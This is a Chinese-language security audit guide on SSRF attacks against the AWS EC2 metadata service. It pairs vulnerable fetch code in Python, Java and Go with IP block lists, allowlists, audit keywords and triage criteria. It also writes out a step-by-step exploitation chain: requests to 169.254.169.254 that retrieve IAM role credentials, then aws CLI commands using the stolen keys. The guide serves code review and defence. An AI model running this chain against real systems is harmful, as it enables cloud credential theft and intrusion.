# SSRF - AWS EC2 Metadata Service (IMDSv1) 凭证窃取

## Details

### 典型代码示例

**Python - requests 库中的 SSRF：**
```python
import requests
from flask import request

@app.route('/fetch', methods=['POST'])
def fetch_resource():
    url = request.form.get('url')
    # 未验证目标地址
    response = requests.get(url, timeout=5)
    return response.text
```

**Java - RestTemplate 中的 SSRF：**
```java
@PostMapping("/proxy")
public String proxy(@RequestParam String targetUrl) {
    RestTemplate template = new RestTemplate();
    // 直接使用用户输入
    String response = template.getForObject(targetUrl, String.class);
    return response;
}
```

**Go - net/http 中的 SSRF：**
```go
func FetchURL(w http.ResponseWriter, r *http.Request) {
    url := r.FormValue("url")
    resp, err := http.Get(url)  // 未校验 URL
    if err == nil {
        io.Copy(w, resp.Body)
    }
}
```

### AWS IMDSv1 元数据访问

**IMDSv1 默认端点：**
```
http://169.254.169.254/latest/meta-data/
```

**获取 IAM 凭证的 SSRF 攻击：**
```python
# 攻击者通过 SSRF 获取 IAM 角色名
curl http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 返回 IAM 角色名，例如：MyAppRole

# 继续获取该角色的临时凭证
curl http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole
```

**返回的凭证示例：**
```json
{
  "Code": "Success",
  "LastUpdated": "2024-11-26T10:30:00Z",
  "Type": "AWS4",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "dRYZ...",
  "Token": "IQoJb3JpZ2...",
  "Expiration": "2024-11-26T17:30:00Z"
}
```

**其他敏感元数据：**
```
# 实例 ID
http://169.254.169.254/latest/meta-data/instance-id

# 可用区
http://169.254.169.254/latest/meta-data/placement/availability-zone

# VPC ID
http://169.254.169.254/latest/meta-data/network/interfaces/macs/

# 用户数据（可能包含启动脚本和敏感信息）
http://169.254.169.254/latest/user-data
```

### 利用链

**第一步：SSRF 漏洞验证**
```
POST /api/webhook HTTP/1.1
webhook_url=http://169.254.169.254/latest/meta-data/
```

**第二步：枚举 IAM 角色**
```
webhook_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 响应返回角色名
```

**第三步：获取临时凭证**
```
webhook_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[角色名]
# 响应返回 AccessKeyId、SecretAccessKey、Token
```

**第四步：使用被盗凭证访问 AWS**
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="dRYZ..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2..."

# 现在可以以该 IAM 角色的权限访问 AWS
aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

### 快速定位核心操作（L1: 关键词扫描）

**SSRF 的常见入口点：**
- `webhook_url`, `callback_url`, `redirect_url`, `target_url`
- `proxy_url`, `fetch_url`, `download_url`, `upload_url`
- 文件处理：图片预览、PDF 转换、缩略图生成
- 第三方集成：OAuth 回调、Webhook、API 代理

**HTTP 客户端库：**
```
requests.get()      # Python
RestTemplate        # Java
axios.get()         # JavaScript
curl_exec()         # PHP
http.Get()          # Go
reqwest::Client     # Rust
```

**云元数据相关关键词：**
- `169.254.169.254` - AWS/GCP/Azure 通用元数据地址
- `metadata.google.internal` - GCP 元数据
- `kubernetes.default` - Kubernetes API
- `iam/security-credentials` - AWS IAM 凭证端点
- `assume-role` - AWS 角色切换

### 快速定位保护机制（L2: 跳读）

**协议白名单：**
```python
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        raise ValueError("Only HTTP(S) allowed")
    return True
```

**IP 地址黑名单：**
```python
import ipaddress

BLOCKED_IPS = [
    '127.0.0.1',
    '0.0.0.0',
    '169.254.169.254',  # AWS 元数据
    '169.254.170.2',    # Azure 元数据
]

def check_ip(hostname):
    ip = socket.gethostbyname(hostname)
    if ip in BLOCKED_IPS:
        raise ValueError("Private IP not allowed")
```

**域名白名单：**
```python
ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com']
if not any(url.startswith(domain) for domain in ALLOWED_DOMAINS):
    raise ValueError("Domain not in whitelist")
```

**DNS 重绑定防护：**
```python
def safe_resolve(hostname):
    ip = socket.gethostbyname(hostname)
    if ip in PRIVATE_RANGES:
        raise ValueError("Private IP")
    # 进行请求
    return requests.get(f"http://{hostname}")
```

**审计技巧（L3: 逐行读）：**
- 检查是否明确阻止了 `169.254.169.254`
- 验证私有 IP 范围检查是否完整（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16）
- 确认 DNS 查询和 HTTP 请求之间是否有时间窗口（TOCTOU）
- 检查是否同时阻止了 `file://` 和 `gopher://` 等协议

**跨模块保护（L4: 跨模块追踪）：**
- 网络层面：安全组、防火墙规则限制对元数据服务的访问
- 应用层面：全局请求拦截器、白名单配置
- IAM 层面：使用 IMDSv2（需要令牌）而非 v1、限制角色权限

## Classify

### 确认为漏洞

- 应用允许用户控制 HTTP 请求的目标 URL
- 未对目标 IP 地址进行私有/本地地址检查
- 明确未阻止 `169.254.169.254` 或 AWS 元数据端点
- 可以通过 PoC 验证能否访问 AWS 凭证端点
- 存在明确的访问链：SSRF 入口 → 元数据服务 → 返回敏感信息

### 误报场景

- 目标地址受严格白名单控制，未包含任何私有地址
- 应用部署环境无 IAM 角色（如本地开发环境、非 AWS）
- 已启用 IMDSv2（需要令牌，无法通过简单 HTTP 请求获取）
- 网络层面隔离：应用容器/实例无权访问元数据服务
- 已验证能够成功阻止对 169.254.x.x 范围的请求

### 代码异味

- IP 黑名单不完整（如仅阻止 127.0.0.1，未阻止其他私有 IP）
- 协议检查不充分（仅检查 HTTP/HTTPS，未阻止 `file://`, `gopher://`）
- DNS 重绑定防护缺失（先查询 IP，再请求时 DNS 已改变）
- 应用在 AWS 环境但未审视是否需要 IAM 凭证隔离

## Low risk

### 降级为低风险的情况

- **完整的 IP 黑名单**：已验证阻止了所有私有 IP 范围（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.x.x）
- **IMDSv2 强制**：使用 IMDSv2（令牌认证），并验证了 v1 完全禁用
- **网络隔离**：应用运行在无 IAM 角色的环境，或 VPC 策略禁止访问元数据服务
- **严格白名单**：仅允许访问预定义的公网域名，完全禁止 IP 直接访问
- **最小权限**：即使凭证泄露，关联的 IAM 角色权限也被严格限制
- **环境验证**：已确认应用不运行在 AWS（如运行在自建数据中心或其他云厂商）

### 需要额外评估的因素

- 泄露的凭证能否访问关键资源（RDS、S3、Secrets Manager）
- 被盗凭证的有效期及权限范围
- 是否存在日志来检测异常凭证使用
- 企业是否有凭证轮换机制
- 是否可以利用这些凭证进行横向移动（如访问其他实例、修改安全组）
